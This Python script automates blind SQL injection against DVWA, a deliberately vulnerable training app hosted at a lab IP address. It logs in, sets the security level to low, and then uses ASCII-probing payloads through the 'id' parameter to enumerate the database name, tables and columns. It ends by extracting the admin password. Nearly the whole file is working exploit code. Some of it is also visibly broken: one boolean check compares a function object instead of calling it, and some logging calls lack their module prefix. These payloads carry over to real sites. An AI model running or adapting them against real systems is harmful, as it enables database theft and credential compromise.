"""
    Blind SQL injection in DVWA    
"""

import requests
import os
import sys
from core import *
sys.path.insert(0,'../') # To import dvwa module
import dvwa
import logs
from bs4 import BeautifulSoup
"""
pip install bs4
pip install lxml
"""
logs.log_level = 2

def test_boolean_operator(sess, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    pay = "1' and 1=1"

    payload = {
            "id":pay,
            "Submit":"Submit"
        }
    resp = sess.get(url, params=payload)
    if bool_check == False:
        logs.print_warning("Boolean test failed at testing False")
        return False
    pay = "1' and 1=2"

    payload = {
            "id":pay,
            "Submit":"Submit"
        }
    resp = sess.get(url, params=payload)
    if bool_check == True:
        logs.print_warning("Boolean test failed at testing True")
        return False
    else:
        return True

def sqli_find_numof_columns(sess, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = sqli_find_count(sess, "1' order by ", "", "", check_equal=False, check=False)
    return out
def sqli_find_len(sess, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    out = sqli_find_count(sess, "1' and length(", subject, ")")
    return out
def sqli_find_name(sess, len, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    req_start = " 1' and ascii(substr("
    req_middle = "))"
    out = sqli_find_string(sess, req_start, subject, req_middle, len)
    return out
def sqli_find_tables_count(sess, subject="table_name", url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    req_start = "1' and (select count("
    req_middle = ") from information_schema.tables where table_schema=database())"
    out = sqli_find_count(sess, req_start, subject, req_middle)

    return out
def sqli_find_table_name_length(sess, table_index, subject="table_name", url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    req_start = "1' and length(substr((select "
    req_middle = " from information_schema.tables where table_schema=database() limit "
    req_middle += str(table_index)
    req_middle += ",1),1))"
    out = sqli_find_count(sess, req_start, subject, req_middle)
    return out
def sqli_find_table_name(sess, len, table_index, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="table_name"):
    out = ""
    i = 0

    while i < len:
        pay = ""
        i += 1
        ascii_max = 255+1
    
        logs.print_verbose("Current character : "+str(i))
        for j in range(ascii_max): # loop through all the ASCII values
            pay = "1' and ascii(substr((select "
            pay += subject
            pay += " from information_schema.tables where table_schema=database() limit "
            pay += str(table_index)
            pay += ",1)"
            pay += "," + str(i)
            pay += "," + str(i)
            pay += "))="
            pay += str(j)
            pay += "#"

            payload = {
                "id":pay,
                "Submit":"Submit"
            }

            logs.print_debug("\t"+str(j) + " : " + pay + " : " + chr(j))
            resp = sess.get(url, params=payload)
            if bool_check(resp): # if this index matches with this ascii value
                out += chr(j) # concatenate the output with the found ASCII character
                logs.print_verbose("Character found : "+chr(j))
                break
    logs.print_debug("Found name : "+out)
    return out
def sqli_find_table_fields_count(sess, table_name, subject="table_name", url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/"):
    out = 0
    i = 1
    while True:
        pay = "1' and (select count(column_name) from information_schema.columns where "
        pay += subject
        pay += "="
        pay += "'" + table_name + "'"
        pay += ")="
        pay += str(i)
        pay += "#"
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == True:
            out = i
            logs.print_debug("Found table fields count : "+str(out))
            break
        i += 1
    return out
def sqli_find_table_field_name_len(sess, table_name, field_index, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    out = 0
    i = 1
    while True:
        pay = "1' and length((select column_name from information_schema.columns where table_name="
        pay += "'" + table_name + "'"
        pay += " limit "
        pay += str(field_index)
        pay += ",1))"
        pay += "="
        pay += str(i)
        pay += "#"
        payload = {
            "id":pay,
            "Submit":"Submit"
        }
        resp = sess.get(url, params=payload)        
        if bool_check(resp) == True:
            out = i
            print_debug("Found count : "+str(out))
            break
        i += 1
    return out
def sqli_find_table_field_name(sess, len, table_name, field_index, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    req_start = "1' and ascii(substr((select column_name from information_schema.columns where table_name="
    req_start += "'" + table_name + "'"
    req_start += " limit " + str(field_index) + ",1)"
    req_middle = "))"
    out = sqli_find_string(sess, req_start, "", req_middle, len)
    return out
def sqli_find_all_table_fields_names(sess, table_name, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    i = 0
    fields = []
    while i < 8:
        len = sqli_find_table_field_name_len(sess, table_name, i)
        name = (sqli_find_table_field_name(sess, len, table_name, i))
        fields.append(name)
        print_success("Retrived index ["+str(i) + "] : "+name)
        i += 1
    return fields
def sqli_find_value_len(sess, element_name, table_name, where_reference, target, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    req_start = "1' and length((select "
    req_start += element_name
    req_start += " from "
    req_start += table_name
    req_start += " where "
    req_start += where_reference
    req_start += "="
    req_start += "'"+target+"'))"
    #print_verbose("Payload : "+pay)
    out = sqli_find_count(sess, req_start, "", "")
    return out
def sqli_find_value(sess, len, element_name, table_name, where_reference, target, url="http://192.168.1.73/dvwa/vulnerabilities/sqli_blind/", subject="database()"):
    req_start = "1' and ascii(substr((select "
    req_start += element_name
    req_start += " from "
    req_start += table_name
    req_start += " where "
    req_start += where_reference
    req_start += "="
    req_start += "'"+target+"'"
    req_start += ")"
    req_middle = "))"
    out = sqli_find_string(sess, req_start, "", req_middle, len)
    return out
def exploit_low(sess):
    # SQL injection
    test_boolean_operator(sess)
    
    ## Determine number of columns
    exploit_num_columns = sqli_find_numof_columns(sess)
    logs.print_success("Found table columns number : "+str(exploit_num_columns))
    ## Determine the length of the database name
    expoit_len_db_name_len = sqli_find_len(sess, subject="database()")
    logs.print_success("Found database name length : "+str(expoit_len_db_name_len))
    ## Determine name of the database
    # 1' and ascii(substr(database(),<index>,<index>))
    exploit_db_name = sqli_find_name(sess, expoit_len_db_name_len, subject="database()")
    logs.print_success("Found database name : "+exploit_db_name)
    ## Determine tables count
    exploit_tables_count = sqli_find_tables_count(sess)
    logs.print_success("Found tables count in database : "+str(exploit_tables_count))

    exploit_table_index = 1

    exploit_table_name_len = sqli_find_table_name_length(sess, exploit_table_index)
    logs.print_success("Found table "+str(exploit_table_index)+" name length : "+str(exploit_table_name_len))

    exploit_table_name = sqli_find_table_name(sess, exploit_table_name_len, exploit_table_index)
    logs.print_success("Found table "+str(exploit_table_index)+" name : "+exploit_table_name)

    exploit_table_fields_count = sqli_find_table_fields_count(sess, exploit_table_name)
    logs.print_success("Found table "+str(exploit_table_index)+" fields count : "+str(exploit_table_fields_count))

    exploit_fields_names = sqli_find_all_table_fields_names(sess, exploit_table_name)
    logs.print_success("Exploit finished !! I'll be with you again : ")
    i = 0
    for elem in exploit_fields_names:
        i += 1
        logs.print_success("Found at index ["+str(i)+"] field : "+elem)
    
    exploit_found_data_len = sqli_find_value_len(sess, exploit_fields_names[4], exploit_table_name, exploit_fields_names[3], "admin")
    print("Found password length : "+str(exploit_found_data_len))

    exploit_found_data = sqli_find_value(sess, exploit_found_data_len, exploit_fields_names[4], exploit_table_name, exploit_fields_names[3], "admin")
    print("Found password : "+exploit_found_data)

def main():
    sess = requests.Session()
    sess = dvwa.login_dvwa(sess, "http://192.168.1.73/dvwa/login.php")
    sess = dvwa.set_dvwa_difficulty(sess, "http://192.168.1.73/dvwa/security.php", "low")
    
    exploit_low(sess)

main()